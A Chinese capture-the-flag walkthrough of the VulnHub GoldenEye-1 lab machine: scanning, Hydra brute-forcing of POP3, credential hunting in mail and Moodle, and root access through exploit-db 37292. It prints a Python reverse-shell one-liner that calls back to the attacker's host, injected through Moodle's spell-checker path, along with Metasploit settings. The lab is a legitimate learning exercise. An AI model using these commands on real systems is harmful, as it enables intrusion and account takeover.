> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DIvwm5Edvr4M7DhyNNUGVg)

靶机链接
----

```
https://www.vulnhub.com/entry/goldeneye-1,240/
```

一、信息收集
------

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9UcicErHmxWfNmRDLyDnSOFuiayGicIcs92I6YMMPZHTheYS105icGJgictA/640?wx_fmt=png)

使用命令：nmap -sP 192.168.182.0/24  
或者使用 netdiscover 获取目标 IP 地址:  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9o1ibicT4VZicHUJG2pCXhudFLMtvjZPddClg1iaUdQxgHZWPj7tfNM3Jrg/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.182.141  
我们开始探索机器。第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了 nmap 全端口 T5 速度扫描：  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9rA0fDcibbMuVMib5tFPLboM02ACSVmnXln0RkXMeANfopYFUJicftYSCQ/640?wx_fmt=png)

使用命令：nmap -sS -sV -T5 -A -p- 192.168.182.141

图中可以看出，目标计算机上有四个可用的开放端口。由于目标计算机上的端口 80 可用，我们首先来检查应用程序。我们在浏览器上打开了目标计算机的 IP，它显示了一个有趣的页面：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9uA2xhZvKwcicEic52A7mVhNHjkllw8Vyu0VSMV9zjzaV9I9iaWEZDvXdg/640?wx_fmt=png)

到 / sev-home / 目录中。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9augTrTgNDmo4rZUKpeq6GROW726zUbvaA79YFFxItAKEXMwZZMex5A/640?wx_fmt=png)

会看到上面的页面需要身份验证，因为它提示我们输入用户名和密码。  
我开始检查主页的 html 内容以获取任何有用的提示（F12 查看）。一段时间后，我发现索引页面有一些有趣的东西，可以进一步探索：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9GD8hGnFGey1O6JHznSDCQP613L2Q5zNwxbYJcrJiaJtMclTkvPRMEQA/640?wx_fmt=png)

在上面的屏幕截图中，可以在红框中看到一个名为 “terminal.js” 的 JavaScript 文件，看起来很有趣。然后我在另一个浏览器窗口中打开此 JavaScript 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9cTvg6zwBWcmGHyU2MrLzwgscCur4QVVYwicLAlnp47DiaaMDIqeeBx1Q/640?wx_fmt=png)

评论部分获得信息：  
用户：boris、Natalya  
我们还找到了一个编码字符串，可以在上面的屏幕快照的突出显示区域中看到它。用户评论中提到这是密码。让我们对字符串进行解码，然后尝试使用这些凭据登录应用程序。  
字符串：  
InvincibleHack3r  
这里我使用了 burp suite Professional 中 Decoder 模块进行 html 解码：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9WKR4OgXd1l8mwDLE2SMbNxe6u1iaI2WAc80YY2QqzLrdHkEmOAzuQLA/640?wx_fmt=png)

我们已经解码了密码：InvincibleHack3r，由于上面已经找到了有效的用户名，尝试下使用用户名密码登陆：http://192.168.182.141/sev-home/

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9Jq5gLPiabjVUZ29rcRWIQwSzardbIb1VFribgQHMbNm6FIS5qiagXZRag/640?wx_fmt=png)

我们已经成功登陆了 GoldenEye 应用程序，继续寻找有用的信息，最后一段英文翻译是（英文较差谷歌翻译）：  
请记住，由于默默无闻的安全性非常有效，因此我们将 pop3 服务配置为在很高的非默认端口上运行…

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9Xvr4ANibJicCCehcgFqRhJjrSojqIO4f6MktZVrUOibwALWKkDJ7cz5gA/640?wx_fmt=png)

检查主页的 html 内容，从上面的消息中，我们可以了解到某个非默认端口上正在运行一个活动的 POP3 服务。由于我们已经在第一步中对目标 IP 进行了完整的 Nmap 扫描，因此我们已经知道运行 POP3 服务器的端口：55006、55007，那么这两个端口就有可能是有一个是跑着 pop3 服务的，浏览器上访问发现是 55007 端口：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9Sw5lf6e1omK93lfBBg23x9Npxm01ZYqGxfwk4ve1yRA489XZia3fyrQ/640?wx_fmt=png)

另外，在分析 “terminal.js” 的 HTML 内容时，我们在注释中发现一条注释，指出目标系统正在使用默认密码。因此，让我们尝试使用在上一步中找到的用户名“ boris”，通过 Hydra 暴力破解 pop3 服务：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9W11SxQjN6Ep9r0Pic8Kz2LTS7E2EbNSvNqEkJgRnedokB5WX4bPzhFQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9UQvPA08buxKvIdWWFpYtTjzVCSMbpeKN1IcOldNtIoFZgticbU4HWzA/640?wx_fmt=png)

我们可以看到暴力攻击已成功，并且该工具已破解了用户 “boris、natalya” 的密码。  
使用命令：echo -e ‘natalya\nboris’ > dayu.txt（创建文本包含两个用户名）  
hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.182.141 -s 55007 pop3（以文本内容使用 hydra 攻击）  
用户：boris 密码：secret1!  
用户：natalya 密码：bird  
我使用 Netcat（简称 nc）实用程序通过 pop3 端口并使用用户 “boris、natalya” 凭据登录到目标服务器邮箱中。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9VPrGz8CiaDCVEWm0sQQ0GZ8yes9nicg553zROpUmwmOqHqpF69yHU26Q/640?wx_fmt=png)

这是 pop3 登录指令学习。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9GG2tuOWHmqjU9tBNxicjkgbKMxyUbFgP5Vg7MiaHf13F2RZtzKHdTNVg/640?wx_fmt=png)

这封邮件指出 root 用户没有扫描电子邮件中的安全风险，这封邮件没什么有用的信息。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9k2M6V8b3fEkA8kD1pDStbqOrbeu8Bf5qcYTLJc6LWd8uASJBiafhwrg/640?wx_fmt=png)

第二封来自用户 “natalya”，称她可以破坏鲍里斯的密码。  
第三封邮件可以看出有一份文件用了 GoldenEye 的访问代码作为附件进行发送，并保留在根目录中。但我们无法从此处阅读附件。  
现在使用 natalya 用户登录看看有什么有用的信息…

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9whNaK0UIFltlO51ckM09RzNicvWZicZ5ElOfOHuQxAR1nXwiaUqQEqiaDw/640?wx_fmt=png)

我们可以看到目标计算机上的 root 用户有一封电子邮件。让我们检查第二封电子邮件。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN98zuKiaLT5iaibJrWrNvSTBicFtibx4avj0bAwfZibf8zS0H21PunWPNgeiatA/640?wx_fmt=png)

在第二封邮件看到了另外一个用户名密码，此服务器域名和网站，还要求我们在本地服务 hosts 中添加域名信息：  
用户名：xenia  
密码：RCP90rulez!  
域：severnaya-station.com  
网址：severnaya-station.com/gnocertdir  
我们现根据邮件提示添加本地域名：severnaya-station.com

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9VGeGm6bIHh64mPAnRtwCS85F5xmonWh9ZvIFmrhKSpMR38SibBH8ibKA/640?wx_fmt=png)

在上面的屏幕截图中，我们可以看到 URL 已成功添加到目标计算机上。因此，让我们在浏览器中打开此 URL。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9Yibh0z6szH4zdO3hRVuuUNvicInISozmVvIeIMxzHTlkVMetqwDAL1rQ/640?wx_fmt=png)

经过如此多的努力… 我们终于在目标计算机上运行了 Web 应用程序，多亏了我们看到的上一封电子邮件。  
刚登陆界面我就看到了 moodle，这是一个开源的 CMS 系统，继续点一点，发现要登陆，使用邮件获得的用户密码进行登陆。  
用户名：xenia  
密码：RCP90rulez!

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9NQ9BZjwV6WPLI8ibSLqgBoPHIwMI9M3JeJGWLMMpm4GUHBpbJo99UlQ/640?wx_fmt=png)

登陆进来就四处都看了看，发现有一封邮件，内容发现用户名 doak  
继续使用 hydra 攻击

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9aCZeMHMMRialV6wdiatVYLHzvRyRGGw5a4RsBh18RIGRwPuUfMXDXgcg/640?wx_fmt=png)

用户名：doak  
密码：goat  
hydra 已成功破解了用户 doak 的密码，使用账号密码继续登陆 pop3 邮件。  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9AYX5nVojReJ0nxibtSia0LMVcaO0mia0DEZqh0lsgwFsrfcmYAezHgqag/640?wx_fmt=png)

邮件消息说，为我们提供了更多登录凭据以登录到应用程序。让我们尝试使用这些凭据登录。  
用户名：dr_doak  
密码：4England!  
使用新的账户密码登录 CMS。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN930mb2SeYaBN7r1scF3sUrXmPNHLqym77pW9EI0vgibespCwVsa2F9XA/640?wx_fmt=png)

进来后一眼就看到右边，发现了一个 s3cret.txt 文件。另外发现这是 Moodle 使用的 2.2.3 版本，细心发现。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9nQhAPSticUkl3G87PuBpEWu20lNDphHSX58j4XHvT10HcPLpZxewhlw/640?wx_fmt=png)

现在我们查看文件的内容，指出管理员凭据已隐藏在映像文件中，让我们在浏览器中打开图像以查看其内容。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9JibD1pdQSiaHR3ibMDp584HibibnwDFp79ksicJJulunLy7U3QbK90xxbtyg/640?wx_fmt=png)

可以使用浏览器下载，也可以使用命令：wget http://severnaya-station.com/dir007key/for-007.jpg 下载到本地。  
根据邮件提示让我们检查图片内容，下载图片后，我们可以使用 binwalk（路由逆向分析工具）、exiftool（图虫）、strings（识别动态库版本指令）等查看 jpg 文件底层内容。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9BwDic1xmQGwl1CoUKhSydHW0LC3nc0sVJD93qpJxg1DtwO7x2wOKQ6w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9WUG50zmMPNuIGRgHuhXh9AibCxekQibEwb7icofsh2icicHE7KRlabZesxg/640?wx_fmt=png)

使用 binwalk 没能查出有用信息，用 exiftool 和 strings 解析得到 Image Description : eFdpbnRlcjE5OTV4IQ==  
显示的是 base-64 编码的字符串（两个等号表示它是 base-64 编码的字符串）。基数为 64 的编码字符串如下所示：  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9fQvhtpKBg7QRqEEh3KKCex2egOMumEaTRhZfyAyPV36Mo1gaXlJ9bQ/640?wx_fmt=png)

随意到网上搜索 base-64 编码解密，很多网站在线提供解密，获得密码：xWinter1995x!  
线索中说，这是管理员用户的密码。管理员用户身份继续登陆应用程序。  
用户名：admin  
密码：xWinter1995x!

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9423k4tdnPygRYoZE2iajGWqsWqKB8q4qChVdek85QxWaKNN6Ab2nmRg/640?wx_fmt=png)

进去内容太多了，花了很多时间查看，图片红框显示和我前面使用 dr_doak 用户登陆邮箱发现的结果一致，这是 Moodle 使用的 2.2.3 版本，获得版本名称后，我快速搜索了网上的可用漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN97A2bgthdUiaPuOXt4bAtOoeDmOAFjb8MyyKuJkMQ1blhpGB7C2iadODA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9ZGoGraMqBiaZLEJJGTgXGialWcRIO6OyY8YMXhqOzWc0hdOMraoBiaa6Q/640?wx_fmt=png)

二、渗透 - getshell
---------------

此版本有许多漏洞利用，由于我们需要在目标计算机上进行外壳访问，因此我选择使用远程代码执行（RCE）漏洞利用。  
使用我们的神器：MSF

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9AdibtxHRqMbqXXqkF7Vic1Q6FKQibUQ7rS0F3ebBXSTsibr1cuibRFWgEYQ/640?wx_fmt=png)

设置用户名：admin  
设置密码：xWinter1995x！  
设置：rhosts severnaya-station.com  
设置：targeturi / gnocertdir  
设置 payload：cmd / unix / reverse  
设置：lhost 192.168.1.45  
这里不会配置的还是别往下学了，去学下 MSF 的基础渗透教学。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9CQl1nnhoMYHic7EIhY9vqGJRPYlALlxxhDIhq6fvmCYTwgB1QY0xs6g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN94tYI5iaibvUlzO3eSSTLQeBT7pWZQW9Az8rdpicyxGcW002A1MNpxlj2g/640?wx_fmt=png)

提权失败，网上搜索看到一篇老外写的 Walkthrough，目标主机上不存在 GCC 编译，只能 CC 编译，所以在需要把 Google Spell 编译改成 PSpellShell 编译。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9hBGW2AmYbwL9FX8mAKzfQf0waTbF6o7ZIzEoS4FwOgYuyhicA6GObCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN90KIgUVg4HWibbGuV02TcDwRJ9SJdzG1ibRY3YybOGSNHIgib4sLbxL4AA/640?wx_fmt=png)

按道理应该能获取 www 低权限，经过百度谷歌多方面咨询大神，是因为我 kali 中 MSF 版本升级太高，会遇到 RCE 无法渗透问题，这里耽误了很多时间，心里想着可以 getshell 了，结果 MMP，反弹 shell 用不了，只能使用内核提权了。  
初步得先拿到随便一个权限，低权限也行呀，NM！！  
只能使用另外的反弹 shell 方式渗透了… 我太难了…  
经过长时间的网上搜索学习，找到了方法。

由于我们已经使用了管理员 admin 用户登录页面，可以进行网站管理，在页面中找到了 Site administration-Server-System paths  
网站管理系统路径，发现可以上传代码。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9w7ZMvkUflzPHIJTCZRruCia6uxRvbyqPYXDeib65Eia65RhrzqtZ0vIsA/640?wx_fmt=png)

本人初学 python 是小甲鱼教的，这里打一波鱼哥广告…  
这里可以用到 python 代码，进行反弹 shell 渗透。  
使用代码：python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.182.135”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’  
使用 python 对本地 6666 端口上传一个 shell，相当于一个 muma，我们需要在本地开启端口 6666。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN99vrgCkdBlZTB1IX4k9rAic8b8vFG2FqNpWInoYweEojbUWzh6eZvSwg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9xicjY9icxnRT5ibicTO28Zk4wfKKx0Ebm0VGV3RPUAqib3WmicWRicoFeqpPg/640?wx_fmt=png)

本地开启监听端口后，回到管理员用户页面。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9bkL1fSx9LpJzpVw9YI1zfzhS2ibDQOFrsuMTZfO1L5TTAMN0dfnT9CQ/640?wx_fmt=png)

需要找到一个能发送数据包出去的地方，这里找到了能发送邮件的地方，随意填写一些文字即可，点击 Toggle spellchecker 进行发送 shell 到本地。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9NhNn1wY3yZp4Oj0fHiceZHNoc6cPM5BZLZatSbXbzwYtFDw3bcF0lxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9c0UsjQROdfpJJ2VSguebamPOPyAx686oWcwguU3Zsww99Vk4oZkjZg/640?wx_fmt=png)

终于获得了一个 shell 权限，不容易啊！！  
使用 python 获得的 shell 权限后，得使用 ptyhon 获得 tty，使用命令：python -c ‘import pty; pty.spawn("/bin/bash")’

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9dvKEa5OnEkJl6tKx0wVYTLk8XT9x4205pFW0MxAB9ibUzkibubmIVqGw/640?wx_fmt=png)

当我运行 id 命令时，它表明该用户不是 root 用户，这是 www-data 的低特权用户，能到这一步已经渗透成功一大半了… 继续努力！！

三、提权
----

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9R5fLz7bwk0dBdle9SET7ic4nHaJqk8h53ToTWzE1Bx8JyZU3fcOvdTw/640?wx_fmt=png)

我们可以在上面的屏幕截图中看到我们拥有操作系统和内核版本号，我在 Google 上搜索了本地漏洞，并找到了几种选择。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9M0Z7emBMAvFNMDuCIQzxtYSia5PpqYONicG9nJ4xd3BuhWIBXZTEp5qA/640?wx_fmt=png)

使用 exploit37292 的 shell，可以从 kali 本地中查找，也可以在网上下载 shell，我这边在 kali 上找，然后使用 python 创建一个服务，通过服务上传 37292.c 到靶机中。  
找到 37292.c 目录

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9mW9MRazjA6KLyqV8TOjicc3kk8Z3dKNz1VnibVC8S5rwmTia7QJIZaHicw/640?wx_fmt=png)

cp /usr/share/exploitdb/exploits/linux/local/37292.c /*Desktop  
复制到桌面。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9iaiaWU5qibrLE9L9O2Wt3AcicTibSGTTZsibVHPsskSa7gHLMdrIp1tVXNWw/640?wx_fmt=png)

由于前面说过靶机未安装 gcc 编译，只能用 cc 编译，需要修改 37292.c 编译。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9iaiaWU5qibrLE9L9O2Wt3AcicTibSGTTZsibVHPsskSa7gHLMdrIp1tVXNWw/640?wx_fmt=png)

将 gcc 改成 cc

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9b5zoxJ13zVN0X1YoRUa3MS6VUtKPXibd8vGfaJylynMUXQa4UsiaHeaw/640?wx_fmt=png)

本地开启服务。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9R1SYicDjGLzxQqXXiaWkvOIIjj2hcdBpKly63pY0QVhbVNXZ8ia0xyk6g/640?wx_fmt=png)

使用 wget 下载 37292.c 脚本到靶机的 tmp 目录。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9Oto3HicSc2d7mKZdiceIOYJ5K6Am9vyGmiaN1tZQnBPWvicSvkbGicQf8Dg/640?wx_fmt=png)

用 cc 编译，赋予可执行权限后，运行 exp。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN97A16y4blYyovRwoHniasL0q3cA5ydN8aKXAKhZepHkBbyMQnG5QSQMA/640?wx_fmt=png)

我们可以看到目标计算机已经获得 root 访问权限，缓了一口气。  
根据挑战的描述，目标是得到 root 权限 & 找到 flag.txt。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDS0yKRSxiaSicFCpzcj8WXN9DxvH74uyAHOn6k2Bo151JodHSPIQiaeA9scyPaGwJmWMnic96al1c7lQ/640?wx_fmt=png)

四、结束语
-----

渗透结束，头铁的兄弟可以继续拿 flag